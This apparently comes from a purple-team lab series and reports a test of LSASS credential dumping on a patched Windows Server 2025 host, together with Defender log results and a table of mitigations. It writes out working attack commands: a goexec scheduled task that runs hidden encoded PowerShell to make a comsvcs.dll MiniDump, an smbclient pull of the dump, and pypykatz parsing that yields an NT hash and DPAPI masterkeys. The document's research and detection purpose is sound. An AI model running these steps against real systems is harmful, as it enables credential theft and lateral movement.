# LSASS Minidump Parsing Remains Viable on Windows Server 2025 (UBR 1742)

**Date:** 2026-04-29  
**Host:** WIN-52H4TKKPD9C (Windows Server 2025, Build 26100, UBR 1742)  
**Defender Signatures:** 1.449.353.0 (current as of test date)  
**Tooling:** goexec (tsch), smbclient, pypykatz  
**Phase:** Credential extraction baseline — no detection engineering in scope for this run

---

## Objective

Determine whether pypykatz can successfully parse an LSASS minidump exfiltrated from a fully patched Windows Server 2025 host at UBR 1742, with current Defender signatures active and no Credential Guard configured.

This is a **baseline test** — telemetry and detection rule validation are out of scope here. The singular question: *does the tooling work against a current build?*

---

## Environment

| Property | Value |
|---|---|
| OS | Windows Server 2025 |
| Build | 26100 |
| UBR | 1742 |
| Defender Signatures | 1.449.353.0 |
| Credential Guard | Not configured |
| RunAsPPL | Not enabled (baseline) |
| Host type | Standalone (WORKGROUP) |
| Local user | `ubuntu` |

---

## Attack Chain

### 1. Dump Delivery — Scheduled Task via goexec (tsch)

A base64-encoded PowerShell payload was delivered via `goexec` using the Task Scheduler (`tsch`) module. The payload executed `comsvcs.dll MiniDump` against the LSASS process, writing output to `C:\Windows\Temp\out2.dmp`.

```bash
# [Kali]
./goexec tsch create 192.168.1.52 \
  -u 'ubuntu' \
  -p 'j44****' \
  --task '\systemshell' \
  --exec 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' \
  --args "-NoP -NonI -W Hidden -Enc $ENCODED"
```

The task was configured to self-delete after execution. Dump completed in approximately 32 minutes (09:28 → 10:00 AM). Final dump size: **53,204 KB**.

### 2. Exfiltration — SMB Pull

```bash
# [Kali]
smbclient //192.168.1.52/C$ -U 'ubuntu%j44****' \
  -c 'get Windows\Temp\out2.dmp /tmp/out290425_SERVER_2025PATCHED_UBR_1742.dmp'
```

Transfer rate: ~369 MB/s (LAN, VMware host-only network).

### 3. Parsing — pypykatz offline

```bash
# [Kali]
pypykatz lsa minidump /tmp/out290425_SERVER_2025PATCHED_UBR_1742.dmp
```

---

## Results

### MSV — NT Hash Extracted ✅

```
== LogonSession ==
username        : ubuntu
domainname      : WIN-52H4TKKPD9C
LM              : NA
NT              : 3c0****************************
SHA1            : af6************************************
DPAPI           : af6************************************
```

NT hash is present and parseable. LM is NA (expected — disabled by default on Server 2025).

### WDigest — Cleartext Not Present ✅ (protection holds)

```
== WDIGEST ==
username        : ubuntu
domainname      : WIN-52H4TKKPD9C
password        : None
```

`UseLogonCredential = 0` is the default on Server 2025. WDigest cleartext is not cached. This protection works as intended.

### DPAPI Masterkeys — Present ✅

Two DPAPI masterkeys were recovered across the two `ubuntu` logon sessions:

| LUID | Key GUID |
|---|---|
| 412375 | 4648f146-c945-4aa3-b060-8f159e973daa |
| 412419 | (second logon session) |

Masterkeys are actionable for offline DPAPI blob decryption where the user's password or domain backup key is known.

### Kerberos

No domain — WORKGROUP host. No TGTs or service tickets in LSASS. Expected.

---

## Key Observations

### What worked
- `comsvcs.dll MiniDump` via scheduled task delivery succeeded against Server 2025 at UBR 1742 with current Defender signatures
- No observable structural changes in LSASS memory (MSV/DPAPI providers) impacted parsing on Server 2025 UBR 1742. pypykatz parsed the dump without issue.
- SMB exfiltration of a 53 MB dump is trivially fast on a LAN segment

### What didn't yield cleartext
- WDigest is suppressed by default — cleartext password not cached
- No Kerberos tickets (standalone host, no domain)

### What was not tested in this run
- **PPL (RunAsPPL)** — this is the next phase. With `RunAsPPL=2` enabled, the handle-open against LSASS should fail at the OS level, preventing standard handle-based dump generation. pypykatz parsing is irrelevant if the dump cannot be created.
- **Credential Guard** — would encrypt MSV secrets using VSM, rendering the NT hash unreadable even from a valid dump
- **Detection telemetry** — ELK/Kibana detection rules (Sysmon EID 1, EID 10, PowerShell logging) are not instrumented for this run. Detection coverage will be validated in a subsequent dedicated session.

---

## Takeaway

Windows Server 2025 at current patch levels (UBR 1742) does not prevent LSASS dump parsing by default. WDigest cleartext protection holds. MSV NT hashes do not.

The realistic mitigations that would have changed this outcome:

| Control | Effect |
|---|---|
| **RunAsPPL = 2** | Blocks handle-open; prevents standard handle-based dump generation |
| **Credential Guard** | Encrypts MSV secrets in VSM; NT hash unreadable from dump |
| **LSA Protection audit** | EID 3065/3066 surface PPL enforcement state and bypass attempts |
| **Both PPL + CG** | Defense in depth — handle blocked AND secrets encrypted |

Neither was enabled in this baseline. The dump was created, exfiltrated, and parsed successfully with standard open-source tooling.

---

## Defender Log Analysis

Post-execution review of the Microsoft Defender Antivirus operational log confirmed zero detections across the entire attack window (09:28–10:00 AM).

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
  Where-Object { $_.TimeCreated -gt (Get-Date).AddHours(-4) } |
  Select-Object TimeCreated, Id, Message |
  Format-List
```

### Events observed

| Time | Event ID | Explanation |
|---|---|---|
| 09:19–09:20 | **2001** | Signature update failed (0x80072ee7 — DNS resolution failure). Network adapter was offline to prevent KB5082063 download. Expected. |
| 09:20 | **2000** | Signature update succeeded to 1.449.353.0 via `MpCmdRun -SignatureUpdate` (separate CDN path). |
| 09:09 / 09:22 | **5007** | Config changes reflecting service restarts and WdConfigHash rotation. Artefacts of `wuauserv`/`bits` service disruption and exclusion path addition. |
| 10:00 | **3002** | RTP filter driver entered pass-through mode (0x80004005 — unspecified error). |
| 10:01 | **3007** | RTP filter driver recovered and resumed scanning. |

### No detections

Event IDs **1116** (threat detected), **1117** (action taken), **1006/1007** (scan finding), and **1015** (suspicious behaviour) are entirely absent from the log.

### Notable: RTP pass-through at dump completion

EID 3002 fired at **10:00:58 AM** — the exact minute the dump completed writing. The RTP filter driver briefly entered pass-through mode, meaning on-access scanning was suspended. This is a side effect of the service disruption earlier in the session, not an intentional evasion technique. However, it is worth noting: even if Defender held a behavioural signature for `comsvcs.dll MiniDump` activity, the RTP engine was momentarily blind at the precise moment the dump file reached its final size.

This condition was not intentionally introduced and is attributed to earlier service disruption in the lab environment. In this run, RTP was not active at the exact moment of dump completion. A clean run with uninterrupted RTP is required to fully validate detection coverage.

**Conclusion: No Defender detections were observed for this technique under the tested conditions (signature 1.449.353.0, Server 2025 UBR 1742) — even when RTP was active during most of the execution window.**

---

## Files

| File | Description |
|---|---|
| `out290425_SERVER_2025PATCHED_UBR_1742.dmp` | Raw LSASS minidump (not uploaded — contains credentials) |
| `pypykatz_output.txt` | Raw parser output (sanitized — hashes redacted) |

---

## References

- [pypykatz](https://github.com/skelsec/pypykatz)
- [goexec](https://github.com/bachimanchi/goexec)
- [Microsoft — Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
- [Microsoft — RunAsPPL](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)

---

*Part of the [AD-Lab-Research](https://github.com/osherjacobs/AD-Lab-Research) series — purple team attack chains with paired detection engineering.*
